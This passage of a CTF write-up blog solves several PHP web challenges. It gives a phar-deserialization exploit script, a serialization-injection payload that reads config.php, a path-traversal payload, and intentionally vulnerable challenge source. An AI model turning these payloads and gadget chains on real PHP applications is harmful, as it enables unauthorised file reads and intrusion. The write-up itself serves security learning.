<p>functions to be dangerous, including :fileatime() filectime() file_exists() file_get_contents() file_put_contents() file() filegroup() fopen() fileinode() filemtime() fileowner() fileperms() is_dir() is_executable() is_file() is_link() is_readable() is_writable() is_writeable() parse_ini_file() copy() unlink() stat() readfile()</p>
</blockquote>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p>所以我们的思路如下:</p>
<ol>
<li>
<p>上传一个phar文件,当然后缀名要修改成jpg,png或者gif</p>
</li>
<li>
<p>在 <code>delete.php</code> 中访问他(<code>download.php</code> 有 <code>base_dir</code>  限制)</p>
</li>
<li>
<p>in delete.php , <code>file_exists()</code> 可以触发反序列化.</p>
</li>
<li>
<p>只有<code>File</code>类中的<code>close()</code>函数可以获取文件内容,而且只有<code>User</code>类中的<code>__destruct</code>函数可以触发他,那么我们放入phar文件中的应该是<code>User</code>类的序列化,但是变量<code>db</code>应该是<code>File</code>类的对象吗?</p>
</li>
<li>
<p>如果真的这么做的话,<code>flag.txt</code>肯定会被读出来,但是没有办法去将他读出来.这个时候开始考虑到只有<code>Filelist</code>类有回显的功能    .</p>
</li>
<li>
<p>同时 , <code>__call</code> 可以处理未知的函数  , 并试图让所有的<code>file</code> 对象去调用这个这个未知的函数.</p>
</li>
<li>
<p>所以,我们最后的利用链是,<code>User.__destruct-&gt;Filelist.__destruct-&gt;Filelist.__call-&gt;File.close()</code>.</p>
</li>
<li>
<p>exp.php are as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ini_set('phar.readonly',0);</span></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"glzjin"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>Finally , go to delete.php and read phar file.</p>
<p><img src="/home/ch4ser/.config/Typora/typora-user-images/1562476007031.png" alt="1562476007031"></p>
<h2 id="TCTF2016-piapiapia">TCTF2016 piapiapia</h2>
<p>source code:</p>
<p>profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $profile=$user-&gt;show_profile($username);</span><br><span class="line">    <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">        header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// 反序列化漏洞</span></span><br><span class="line">        $profile = unserialize($profile);</span><br><span class="line"></span><br><span class="line">        $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">        $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">        $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="comment">// 如果我们可以控制photo这个变量,那么就可以打开任意文件了</span></span><br><span class="line">        $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">        $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 这里可以将nickname声明成一个数组来绕过限制</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">        $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">        <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">        $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">        $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">        $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="comment">// 变量photo要被处理 </span></span><br><span class="line">        $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">        $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">        $value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回选择的结果</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">            $config[<span class="string">'hostname'</span>],</span><br><span class="line">            $config[<span class="string">'username'</span>], </span><br><span class="line">            $config[<span class="string">'password'</span>]</span><br><span class="line">        );</span><br><span class="line">        mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ordinary sql query</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">        $result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">        $key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">        $value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">        $sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);       <span class="comment">#\   \\ </span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">        <span class="comment">// 'where' will be replaced by 'hacker',which leads to string length plus one for each replacement.</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>
<p>config.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">    $config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">    $config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">    $config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">    $flag = &apos;&apos;; // &lt;= flag is here and we need to read it.</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>see <code>unserialize()</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511495-8ac41c80-aa29-11e9-9ffb-2e1889602ebb.png" alt="1562311707783"></p>
<p>As mentioned in source code, we can generate the payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/60750111-694d4480-9fd6-11e9-872e-aabff95d0aa9.png" alt="image"></p>
<p>After doing that, go to <code>profile.php</code>, which will show us a base64 code in its source code:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511543-aaf3db80-aa29-11e9-86a0-81b289e9d78a.png" alt="1562385121228"></p>
<h2 id="HTCF2018-warmup">HTCF2018 warmup</h2>
<p>source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">	<span class="comment">// to include ffffllllaaaagggg</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">	    <span class="comment">// has to be string</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">// must be in whitelist</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">	    <span class="comment">// also must be in whitelist</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"if"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ifif"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file=source.php?/../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>It is notable that <code>source.php?/</code> was regarded as a folder , though not exits, and we should jump out of it using a <code>../</code>.</p>
<h2 id="2019强网杯-upload">2019强网杯 upload</h2>
<p>虽然名字叫做<code>upload</code> 但是更多偏重于代码审计，首先根据第二题的提示(???)，发现了一个<code>/www.tar.gz</code> ，解压之后打开是<code>thinkphp</code>源码，然后从官网中下载源码，对比发现在<code>application</code> 目录下面多了一个<code>web</code> 目录，里面有价值的文件有<code>Index.php</code> <code>Profile.php</code> <code>Login.php</code> <code>Register.php</code> ,然后。。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;<span class="comment">//因为最后我们不上传文件，所以跳过这段</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">........</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当访问不存在的属性的时候调用</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当访问不存在的方法的时候调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">	    <span class="comment">// 反序列化漏洞警告</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
